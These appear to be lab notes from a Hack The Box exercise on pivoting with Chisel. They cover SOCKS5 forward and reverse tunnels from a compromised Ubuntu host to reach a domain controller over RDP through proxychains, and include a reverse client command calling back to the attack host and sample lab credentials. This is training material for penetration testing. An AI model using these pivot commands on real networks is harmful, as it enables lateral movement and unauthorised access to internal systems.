# SOCKS5 Tunneling with Chisel
Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment.
Let us consider a scenario where we have to tunnel our traffic to a webserver on the 172.16.5.0/23 network (internal network). We have the Domain Controller with the address 172.16.5.19. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.
## Setting Up & Using Chisel
```
git clone https://github.com/jpillora/chisel.git
```
## Building the Chisel Binary
```
w1j0y@htb[/htb]$ cd chisel
```
```
go build
```
## Transferring Chisel Binary to Pivot Host
```
w1j0y@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
```
## Connecting to the Chisel Server
```
./chisel client -v 10.129.202.64:1234 socks
```
### Ubuntu Server 10.129.202.64
#### Running the Chisel Server on the Pivot Host
The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```
**=> Connection established with the chisel client**
## Editing & Confirming proxychains.conf
```
socks5 127.0.0.1 1080
```
Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
### Pivoting to the DC
```
w1j0y@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
**=> Windows Host reached through the Ubuntu Pivot Host (check mind map for more visual details)**
# Chisel Reverse Pivot
In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
## Starting the Chisel Server on our Attack Host
```
d0x777@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
```
## Then we connect from the Ubuntu (pivot host) to our attack host, using the option R:socks
### Ubuntu Server 10.129.202.64
We connect from the Ubuntu (pivot host) to our attack host, using the option R:socks
```
ubuntu@WEB01$ ./chisel client -v <attackhostip>:1234 R:socks
```
## Editing & Confirming proxychains.conf on our Attack host
```
socks5 127.0.0.1 1080
```
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
**=> Windows Host reached through the Ubuntu Pivot Host (check mind map for more visual details)**
# Exercise
```
https://github.com/jpillora/chisel/releases
```
What finally worked on the ubuntu server is transferring the `.gz` file to the ubuntu machine, changing permissions, and executing the server command on the ubuntu machine (version 1.9.1 for linux_386 worked fine on the ubuntu server)
## Ubuntu Host
```
chmod +x chisel_1.9.1_linux_386
```
```
./chisel_1.9.1_linux_386 server -v -p 1234 --socks5
```
The client command worked for chisel-1.7.4 on the linux machine
## Linux machine
```
./chisel client -v 10.129.12.20:1234 socks
```
```
socks5 127.0.0.1 1080
```
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```